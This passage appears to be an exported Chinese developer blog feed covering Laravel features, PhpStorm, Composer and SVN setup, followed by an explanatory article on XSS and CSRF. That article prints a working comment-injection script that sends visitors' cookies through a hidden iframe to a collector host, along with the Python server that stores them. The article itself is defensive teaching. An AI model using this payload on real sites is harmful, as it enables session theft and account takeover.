<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Encryption</span>\<span class="title">DecryptException</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$decrypted</span> = <span class="title class_">Crypt</span>::<span class="variable constant_">decrypt</span> (<span class="variable">$encryptedValue</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (DecryptException <span class="variable">$e</span>) &#123; </span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h2><p>应用程序中事件的定义、记录和聆听都非常迅速。<br>EventServiceProvider 事件中的 listen 包含记录在你应用程序上所有事件的列表。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="variable">$listen</span> = [<span class="string">&#x27;App\Events\PodcastWasPurchased&#x27;</span> =&gt; [ <span class="string">&#x27;App\Listeners\EmailPurchaseConfirmation&#x27;</span>, ], ];</span><br></pre></td></tr></table></figure>

<h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><p>在 Laravel 中分页是非常容易的因为它能够根据用户的浏览器当前页面生成一系列链接。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Controllers</span>; <span class="keyword">use</span> <span class="title">DB</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$users</span> = DB::<span class="variable constant_">table</span> (<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">paginate</span> (<span class="number">15</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span> (<span class="string">&#x27;user.index&#x27;</span>, [<span class="string">&#x27;users&#x27;</span> =&gt; <span class="variable">$users</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="对象关系图（ORM）"><a href="#对象关系图（ORM）" class="headerlink" title="对象关系图（ORM）"></a>对象关系图（ORM）</h2><p>Laravel 包含一个处理数据库的层，它的对象关系图被称为 Eloquent 。另外这个对象关系图也适用于 PostgreSQL。</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">$users = User::where <span class="function"><span class="params">(<span class="string">&#x27;votes&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="number">100</span>)</span>-&gt;</span>take <span class="function"><span class="params">(<span class="number">10</span>)</span>-&gt;</span>get ();</span><br><span class="line">foreach ($users <span class="keyword">as</span> $user) &#123;</span><br><span class="line">  var_dump ($user-&gt;name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><p>单元测试的开发是一个耗费大量时间的任务，但是它却是保证我们的应用程序保持正常工作的关键。Laravel 中可使用 PHPUnit 执行单元测试。</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">use Illuminate<span class="string">\Foundation\Testing\WithoutMiddleware;</span></span><br><span class="line">use Illuminate<span class="string">\Foundation\Testing\DatabaseTransactions;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExampleTest</span> <span class="keyword">extends</span> <span class="title class_ inherited__">TestCase</span> &#123;</span><br><span class="line">  public <span class="keyword">function</span> testBasicExample () &#123;</span><br><span class="line">    $this-&gt;visit <span class="function"><span class="params">(<span class="string">&#x27;/&#x27;</span>)</span> -&gt;</span>see <span class="function"><span class="params">(<span class="string">&#x27;Laravel 5&#x27;</span>)</span> -&gt;</span>dontSee (<span class="string">&#x27;Rails&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="待办事项清单"><a href="#待办事项清单" class="headerlink" title="待办事项清单"></a>待办事项清单</h2><p>Laravel 提供在后台使用待办事项清单（to do list）处理复杂、漫长流程的选择。它可以让我们异步处理某些流程而不需要用户的持续导航。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>Laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 PhpStorm+Composer 快速初始化项目</title>
    <url>/2016/08/phpstorm-composer/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>PhpStorm 是一款非常出色的 Php IDE；vim 的忠实拥泵，可以添加一个 <code>IdeaVim</code> 的插件，继续使用 vim 的功能。二者结合，当属神器。</p>
<p>当然，我还希望能更先进点，Composer 的出现，使得 Php 项目的代码组织和包依赖变的比以前简单了。三者的结合会如何？</p>
<span id="more"></span>

<h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>使用 PhpStorm 创建项目，这个我就不再废话了。 无论你是通过版本控制系统 checkout 一个项目；</p>
<p>还是直接 create 一个本地项目；或者 create 一个远程项目 … … 俺都不 care。Just do it。 </p>
<h2 id="创建项目组织结构"><a href="#创建项目组织结构" class="headerlink" title="创建项目组织结构"></a>创建项目组织结构</h2><p>所谓项目组织结构，最主要的就是目录结构了，我个人的习惯是 <code>project_root -webroot</code>。</p>
<p>nginx 或者 apache 或者 iis 的 root 目录 -js -css -img -index.php 项目入口文件 -vendor composer 管理的包，库所在目录 -composer.json - 依赖的库，包等等。</p>
<p>使用 composer 管理 -apps 自己根据情况设定或者根据使用的框架来设定子目录 -data 一些数据 -docs 一些文档 复制代码 可根据个人情况自由设定。</p>
<p>但是使用 composer 一定会有 vendor 目录，vendor 目录也不需要你手动创建，使用 composer 的时候会自动创建 使用 composer 初始化项目。</p>
<p>直接下载 composer.phar 包 (phar 包类似 java 的 jar 包), 放在项目根目录下 当你的工作目录是 workspace, 项目目录为 <code>workspace/project_name</code>。</p>
<p>其实你可以直接把 composer.phar 放在 workspace 目录下 在 <code>workspace/project_name</code> 目录下，执行 <code>php ../composer.phar command</code> 即可 (command 可替换为任何可用命令)</p>
<p>运行 PhpStorm 的 Terminal 工具，执行 composer 相关命令 当然你也可以 win+r 键，输入 cmd，进入 dos 命令行，然后切换目录到当前项目根目录执行命令</p>
<p>php composer.phar init 初始化 composer.json 文件，运行命令会要求你输入一些信息，根据提示做吧 一直到 Define your dependencies 这一步，就是引入外部依赖</p>
<p>php composer.phar install 安装依赖包到 vendor 目录下，如果没有 vendor 目录会自动创建 当然你也可以在项目根目录下手动创建 <code>composer.json</code>。</p>
<p>然后再 php composer.phpar install 如果想删除对某个包的依赖，只能是手动删除 vendor 目录下的包，然后 <code>php composer.phar update</code> 顺带说下，</p>
<p>PhpStorm 里面新建项目可选择创建 composer 项目，那为什么要使用命令行？</p>
<p>原因就是 composer 的库，一直在加载的路上 不知道 <code>gfw</code> 弄的还是怎么搞的，命令行虽然慢点一定能成功。</p>
<h2 id="composer-常用命令"><a href="#composer-常用命令" class="headerlink" title="composer 常用命令"></a>composer 常用命令</h2><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">`composer list` 列出所有可用的命令。</span><br><span class="line"></span><br><span class="line">`composer init` 初始化 composer.json 文件 (就不劳我们自己费力创建啦)。会要求输入一些信息来描述我们当前的项目，还会要求输入依赖包。</span><br><span class="line"></span><br><span class="line">`composer install` 读取 composer.json 内容，解析依赖关系。安装依赖包到 vendor 目录下。</span><br><span class="line"></span><br><span class="line">`composer update` 更新最新的依赖关系到 compsoer.lock 文件，解析最新的依赖关系并且写入 composer.lock 文件。</span><br><span class="line"></span><br><span class="line">`composer search packagename` 搜索包，packagename 替换为你想查找的包名称。</span><br><span class="line"></span><br><span class="line">`composer require packagename` 添加对 packagename 的依赖，packagename 可修改为你想要的包名称</span><br><span class="line"></span><br><span class="line">`composer show packagename`</span><br><span class="line"></span><br><span class="line">`composer self-update` 更新 composer.phar 文件自身</span><br><span class="line"></span><br><span class="line">`composer command --help` 以上所有命令都可以添加 --help 选项查看帮助信息 </span><br></pre></td></tr></table></figure>

<p>更详细准确的命令信息，请访问 <span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwY29tcG9zZXIuY29tLw==">phpcomposer<i class="fa fa-external-link-alt"></i></span> 进行查看。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>PhpStorm</tag>
        <tag>Composer</tag>
      </tags>
  </entry>
  <entry>
    <title>PhpStorm 常用配置和常用快捷键</title>
    <url>/2016/08/phpstorm-setting/</url>
    <content><![CDATA[<h2 id="PhpStorm-常用配置"><a href="#PhpStorm-常用配置" class="headerlink" title="PhpStorm 常用配置"></a>PhpStorm 常用配置</h2><ol>
<li>从版本控制系统创建项目:<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">CVS -&gt; Checkout <span class="keyword">from</span> Version Control</span><br></pre></td></tr></table></figure></li>
</ol>
<span id="more"></span>

<ol start="2">
<li><p>关联 DOC 文档（右键）: </p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"><span class="keyword">External</span> Librariese -&gt; Configure PHP <span class="keyword">include</span> paths</span><br></pre></td></tr></table></figure>
</li>
<li><p>去掉波浪线:</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">settings</span> -&gt;</span> E<span class="function"><span class="title">ditor</span> -&gt;</span> C<span class="function"><span class="title">olors</span> &amp; Fonts -&gt;</span> G<span class="function"><span class="title">eneral</span> -&gt;</span> TYPO-&gt;Effects</span><br></pre></td></tr></table></figure>
</li>
<li><p>显示行号:</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">settings</span> -&gt;</span> E<span class="function"><span class="title">ditor</span>-&gt;</span>A<span class="function"><span class="title">ppearance</span>-&gt;</span>Show line numbers </span><br></pre></td></tr></table></figure>
</li>
<li><p>远程或本地同步文件:</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">T<span class="function"><span class="title">ools</span> -&gt;</span> D<span class="function"><span class="title">eploments</span> -&gt;</span> Configuration</span><br></pre></td></tr></table></figure>
</li>
<li><p>去掉右上角浏览器图标:</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">settings</span> -&gt;</span> <span class="function"><span class="title">tools</span> -&gt;</span> WebBrowsers</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加 VIM 插件:</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">settings</span>-&gt;</span><span class="function"><span class="title">editor</span> -&gt;</span><span class="function"><span class="title">plugins</span>-&gt;</span><span class="function"><span class="title">browse</span> repositories -&gt;</span> 搜索 VIM</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动的时候不打开工程文件</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">Settings-&gt;General 去掉 Reopen last <span class="keyword">project</span> <span class="keyword">on</span> startup.</span><br></pre></td></tr></table></figure>
</li>
<li><p>取消自动保存</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">appearance</span> -&gt;</span> <span class="function"><span class="title">system</span> settings -&gt;</span> save file 的两个选项 去掉</span><br></pre></td></tr></table></figure>
</li>
<li><p>将编辑的文件加星号标识:</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">settings</span> -&gt;</span> <span class="function"><span class="title">editor</span> -&gt;</span> <span class="function"><span class="title">editor</span> tabs -&gt;</span> 勾选 mark modifed tabs…</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加扩展名高亮显示:</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">settings</span> -&gt;</span> <span class="function"><span class="title">editor</span> -&gt;</span> file types  </span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="PhpStorm-常用快捷键"><a href="#PhpStorm-常用快捷键" class="headerlink" title="PhpStorm 常用快捷键"></a>PhpStorm 常用快捷键</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> + option + l                        将代码格式化</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> + <span class="built_in">shift</span> + u                         切换大小写</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> + <span class="built_in">shift</span> + + /command + <span class="built_in">shift</span> + -    折叠 / 展开所有区块</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> + e                                 列出最后打开的文件</span><br><span class="line"></span><br><span class="line">control + tab  /control + <span class="built_in">shift</span> + tab       切换打开的文件</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> + /                                 行注释</span><br><span class="line"></span><br><span class="line">ctrl + <span class="built_in">shift</span> + /                            块注释</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> + b                                 函数追踪，同 <span class="built_in">command</span> + 单击</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> + alt + &lt; or &gt;                      操作动作前进 / 回退</span><br><span class="line"></span><br><span class="line"><span class="built_in">shift</span> + <span class="built_in">command</span> + r                         按文件名搜索对应文件所在路径</span><br><span class="line"></span><br><span class="line"><span class="built_in">shift</span> + <span class="built_in">command</span> + t                         按类名搜索对应文件所在路径</span><br><span class="line"></span><br><span class="line"><span class="built_in">shift</span> + <span class="built_in">command</span> + c                         复制当前文件所在路径</span><br><span class="line"></span><br><span class="line">Command + Shift + O                         打开文件</span><br><span class="line"></span><br><span class="line">Command + O                                 打开类</span><br><span class="line"></span><br><span class="line">alt + F1                                    定位编辑文件所在位置:</span><br><span class="line"></span><br><span class="line">alt + F12                                   打开命令行栏</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>PhpStorm</tag>
      </tags>
  </entry>
  <entry>
    <title>PhpStorm 中如何配置 SVN，详细操作方法</title>
    <url>/2016/08/phpstorm-svn/</url>
    <content><![CDATA[<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>PhpStorm 是一个轻量级且便捷的 PHP IDE，其提供的智能代码补全，快速导航以及即时错误检查等功能大大提高了编码效率。</p>
<p>它是一款商业的 PHP 集成开发工具，以其独特的开发便利性，短时间内赢得了大量 PHPer 的青睐。</p>
<span id="more"></span>

<p>SVN 是 Subversion 的简称，是一个开放源代码的版本控制系统。说得简单一点 SVN 就是用于多个人共同开发同一个项目，达到共用资源、记录项目版本的目的。</p>
<p>PhpStorm 内置了 svn 支持，因此无需单独下载 svn。</p>
<h2 id="2-操作步骤"><a href="#2-操作步骤" class="headerlink" title="2. 操作步骤"></a>2. 操作步骤</h2><p>下面是在 PhpStorm 中配置 svn 的操作方法：</p>
<h3 id="2-1-打开-Subversion"><a href="#2-1-打开-Subversion" class="headerlink" title="2.1 打开 Subversion"></a>2.1 打开 Subversion</h3><p>打开 PhpStorm 找到工具  VCS—&gt;Checkout from Version Control—&gt;Subversion ，点击进入。</p>
<h3 id="2-2-添加"><a href="#2-2-添加" class="headerlink" title="2.2 添加"></a>2.2 添加</h3><p>点击页面中的 “+” 号，然后输入 svn 地址（Repository URL 仓库链接）。点击 OK。</p>
<h3 id="2-3-svn-检出"><a href="#2-3-svn-检出" class="headerlink" title="2.3 svn 检出"></a>2.3 svn 检出</h3><p>这时候你能浏览到 svn 上文件列表。点击 Checkout。</p>
<h3 id="2-4-选择本地目录"><a href="#2-4-选择本地目录" class="headerlink" title="2.4 选择本地目录"></a>2.4 选择本地目录</h3><p>选择一个本地的目标目录，点击 OK。选择需要更新到本地的版本，点击 OK。选择 svn 服务器版本，点击 OK。</p>
<h3 id="2-5-更新到本地"><a href="#2-5-更新到本地" class="headerlink" title="2.5 更新到本地"></a>2.5 更新到本地</h3><p>第一次更新可能时间会长一点。耐心等待。完成后会询问你是否打开该项目，点击 YES，进入项目。到此为止项目已经更新到本地。</p>
<h3 id="2-6-更新及提交"><a href="#2-6-更新及提交" class="headerlink" title="2.6 更新及提交"></a>2.6 更新及提交</h3><p>项目开发过程中需要更新的时候点击 VCS↓，需要提交的时候点击 VCS↑。</p>
<h2 id="3-过程中可能遇到的问题"><a href="#3-过程中可能遇到的问题" class="headerlink" title="3. 过程中可能遇到的问题"></a>3. 过程中可能遇到的问题</h2><h3 id="3-1-账号和密码"><a href="#3-1-账号和密码" class="headerlink" title="3.1 账号和密码"></a>3.1 账号和密码</h3><p>配置过程中若需要账号和密码，按要求输入即可。可能会要求输入多次。</p>
<h3 id="3-2-未指定可执行项目"><a href="#3-2-未指定可执行项目" class="headerlink" title="3.2 未指定可执行项目"></a>3.2 未指定可执行项目</h3><p>在进行到 2.3 的时候可能会出现 <code>Executable is not specified</code> (未指定可执行项目) </p>
<p>提示；或者出现 <code>Connot run program &quot;svn&quot;(……): CreateProcess error=2,……</code></p>
<p>问题出在命令行工具上。</p>
<p>解决办法：点击 File—&gt;Settings，找到 Version Control——&gt;Subversion——&gt;General 选项卡，全部取消选择。</p>
<h2 id="4-深入掌握-PhpStorm-版本控制工具"><a href="#4-深入掌握-PhpStorm-版本控制工具" class="headerlink" title="4. 深入掌握 PhpStorm 版本控制工具"></a>4. 深入掌握 PhpStorm 版本控制工具</h2><p>查看 svn 历史记录：VCS—&gt;Subversion—&gt;Show History，点击进入。然后点击旁边的双向箭头，显示该版本提交的变更文档列表。然后点击左上角按钮，显示文档变更对比。</p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>通过对 svn 的配置，不知你能否感受到 PhpStorm 的强大。这就是程序员的必备神器。其中关于 svn 的相关操作还有很多，剩下的需要自行摸索了。</p>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>PhpStorm</tag>
        <tag>Svn</tag>
      </tags>
  </entry>
  <entry>
    <title>总结 XSS 与 CSRF 两种跨站攻击</title>
    <url>/2016/08/security-xss-csrf/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在那个年代，大家一般用拼接字符串的方式来构造动态 SQL 语句创建应用，于是 SQL 注入成了很流行的攻击方式。在这个年代， 参数化查询已 <a href="#%E6%80%BB%E7%BB%93"><code>[1]</code></a> 经成了普遍用法，我们已经离 SQL 注入很远了。但是，历史同样悠久的 XSS 和 CSRF 却没有远离我们。由于之前已经对 XSS 很熟悉了，所以我对用户输入的数据一直非常小心。如果输入的时候没有经过 Tidy 之类的过滤，我一定会在模板输出时候全部转义。所以个人感觉，要避免 XSS 也是很容易的，重点是要 “小心”。但最近又听说了另一种跨站攻击 CSRF ，于是找了些资料了解了一下，并与 XSS 放在一起做个比较。</p>
<span id="more"></span>

<h2 id="XSS：脚本中的不速之客"><a href="#XSS：脚本中的不速之客" class="headerlink" title="XSS：脚本中的不速之客"></a>XSS：脚本中的不速之客</h2><p>XSS 全称 “跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</p>
<p>运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧 —— 一个关不掉的窗口：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="attribute">alert</span> (<span class="string">&quot;你关不掉我～&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>也可以是盗号或者其他未授权的操作 —— 我们来模拟一下这个过程，先建立一个用来收集信息的服务器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">跨站脚本注入的信息收集服务器</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line">app = bottle.Bottle()</span><br><span class="line">plugin = bottle.ext.sqlite.Plugin(dbfile=<span class="string">&#x27;/var/db/myxss.sqlite&#x27;</span>)</span><br><span class="line">app.install(plugin)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/myxss/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">cookies, db</span>):</span><br><span class="line">    SQL = <span class="string">&#x27;INSERT INTO &quot;myxss&quot; (&quot;cookies&quot;) VALUES (?)&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        db.execute(SQL, cookies)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>然后在某一个页面的评论中注入这段代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用 &lt;script type=&quot;text/javascript&quot;&gt;&lt;/script&gt; 包起来放在评论中</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"><span class="variable language_">window</span>, <span class="variable language_">document</span></span>) &#123;</span><br><span class="line">    <span class="comment">// 构造泄露信息用的 URL</span></span><br><span class="line">    <span class="keyword">var</span> cookies = <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">&quot;http://192.168.123.123/myxss/&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="variable language_">window</span>.<span class="built_in">encodeURI</span>(cookies);</span><br><span class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span><br><span class="line">    <span class="keyword">var</span> hideFrame = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">    hideFrame.<span class="property">height</span> = <span class="number">0</span>;</span><br><span class="line">    hideFrame.<span class="property">width</span> = <span class="number">0</span>;</span><br><span class="line">    hideFrame.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">    hideFrame.<span class="property">src</span> = xssURI;</span><br><span class="line">    <span class="comment">// 开工</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(hideFrame);</span><br><span class="line">&#125;)(<span class="variable language_">window</span>, <span class="variable language_">document</span>);</span><br></pre></td></tr></table></figure>

<p>于是每个访问到含有该评论的页面的用户都会遇到麻烦 —— 他们不知道背后正悄悄的发起了一个请求，是他们所看不到的。而这个请求，会把包含了他们的帐号和其他隐私的信息发送到收集服务器上。</p>
<p>我们知道 AJAX 技术所使用的 XMLHttpRequest 对象都被浏览器做了限制，只能访问当前域名下的 URL，所谓不能 “跨域” 问题。这种做法的初衷也是防范 XSS，多多少少都起了一些作用，但不是总是有用，正如上面的注入代码，用 iframe 也一样可以达到相同的目的。甚至在愿意的情况下，我还能用 iframe 发起 POST 请求。当然，现在一些浏览器能够很智能地分析出部分 XSS 并予以拦截，例如新版的 Firefox、Chrome 都能这么做。但拦截不总是能成功，何况这个世界上还有大量根本不知道什么是浏览器的用户在用着可怕的 IE6。从原则上将，我们也不应该把事关安全性的责任推脱给浏览器，所以防止 XSS 的根本之道还是过滤用户输入。用户输入总是不可信任的，这点对于 Web 开发者应该是常识。</p>
<p>正如上文所说，如果我们不需要用户输入 HTML 而只想让他们输入纯文本，那么把所有用户输入进行 HTML 转义输出是个不错的做法。似乎很多 Web 开发框架、模版引擎的开发者也发现了这一点，Django 内置模版和 Jinja2 模版总是默认转义输出变量的。如果没有使用它们，我们自己也可以这么做。PHP 可以用 <code>htmlspecialchars</code> 函数，Python 可以导入 cgi 模块用其中的 <code>cgi.escape</code> 函数。如果使用了某款模版引擎，那么其必自带了方便快捷的转义方式。</p>
<p>真正麻烦的是，在一些场合我们要允许用户输入 HTML，又要过滤其中的脚本。Tidy 等 HTML 清理库可以帮忙，但前提是我们小心地使用。仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。对于复杂的情况，我个人更倾向于使用简单的方法处理，简单的方法就是白名单重新整理。用户输入的 HTML 可能拥有很复杂的结构，但我们并不将这些数据直接存入数据库，而是使用 HTML 解析库遍历节点。获取其中数据（之所以不使用 XML 解析库是因为 HTML 要求有较强的容错性）。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。这样可以确保万无一失 —— 如果用户的某种复杂输入不能为解析器所识别（前面说了 HTML 不同于 XML，要求有很强的容错性）。那么它不会成为漏网之鱼，因为白名单重新整理的策略会直接丢弃掉这些未能识别的部分。最后获得的新 HTML 元素树，我们可以拍胸脯保证 —— 所有的标签、属性都来自白名单，一定不会遗漏。</p>
<p>现在看来，大多数 Web 开发者都了解 XSS 并知道如何防范，往往大型的 XSS 攻击（包括前段时间新浪微博的 XSS 注入）都是由于疏漏。我个人建议在使用模版引擎的 Web 项目中，开启（或不要关闭）类似 <code>Django Template、Jinja2</code> 中 “默认转义”（Auto Escape）的功能。在不需要转义的场合，我们可以用类似 <code>&#123;&#123; myvar | raw &#125;&#125;</code> 的方式取消转义。这种白名单式的做法，有助于降低我们由于疏漏留下 XSS 漏洞的风险。</p>
<p>另外一个风险集中区域，是富 AJAX 类应用（例如豆瓣网的阿尔法城）。这类应用的风险并不集中在 HTTP 的静态响应内容，所以不是开启模版自动转义能就能一劳永逸的。再加上这类应用往往需要跨域，开发者不得不自己打开危险的大门。这种情况下，站点的安全非常依赖开发者的细心和应用上线前有效的测试。现在亦有不少开源的 XSS 漏洞测试软件包（似乎有篇文章提到豆瓣网的开发也使用自动化 XSS 测试），但我都没试用过，故不予评价。不管怎么说，我认为从用户输入的地方把好关总是成本最低而又最有效的做法。</p>
<h2 id="更新（2014-10-04）"><a href="#更新（2014-10-04）" class="headerlink" title="更新（2014-10-04）"></a>更新（2014-10-04）</h2><p>这里附上一些 “白名单” 消毒 HTML 标签和属性（Sanitize HTML）的开源解决方案：</p>
<ul>
<li>Python: <span class="exturl" data-url="aHR0cDovL2x4bWwuZGUvbHhtbGh0bWwuaHRtbCNjbGVhbmluZy11cC1odG1s">lxml.html.clean<i class="fa fa-external-link-alt"></i></span> &#x2F; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pzb2NvbC9ibGVhY2g=">bleach<i class="fa fa-external-link-alt"></i></span></li>
<li>Ruby: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Jncm92ZS9zYW5pdGl6ZQ==">Sanitize<i class="fa fa-external-link-alt"></i></span></li>
<li>JavaScript: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B1bmthdmUvc2FuaXRpemUtaHRtbA==">sanitize-html<i class="fa fa-external-link-alt"></i></span></li>
<li>PHP: <span class="exturl" data-url="aHR0cDovL2h0bWxwdXJpZmllci5vcmcv">htmlpurifier<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h2 id="CSRF：冒充用户之手"><a href="#CSRF：冒充用户之手" class="headerlink" title="CSRF：冒充用户之手"></a>CSRF：冒充用户之手</h2><p>起初我一直弄不清楚 CSRF 究竟和 XSS 有什么区别，后来才明白 CSRF 和 XSS 根本是两个不同维度上的分类。XSS 是实现 CSRF 的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF。</p>
<p>CSRF 的全称是 “跨站请求伪造”，而 XSS 的全称是 “跨站脚本”。看起来有点相似，它们都是属于跨站攻击 —— 不攻击服务器端而攻击正常访问网站的用户，但前面说了，它们的攻击类型是不同维度上的分类。CSRF 顾名思义，是伪造请求，冒充用户在站内的正常操作。我们知道，绝大多数网站是通过 cookie 等方式辨识用户身份（包括使用服务器端 Session 的网站，因为 Session ID 也是大多保存在 cookie 里面的），再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。</p>
<p>严格意义上来说，CSRF 不能分类为注入攻击，因为 CSRF 的实现途径远远不止 XSS 注入这一条。通过 XSS 来实现 CSRF 易如反掌，但对于设计不佳的网站，一条正常的链接都能造成 CSRF。</p>
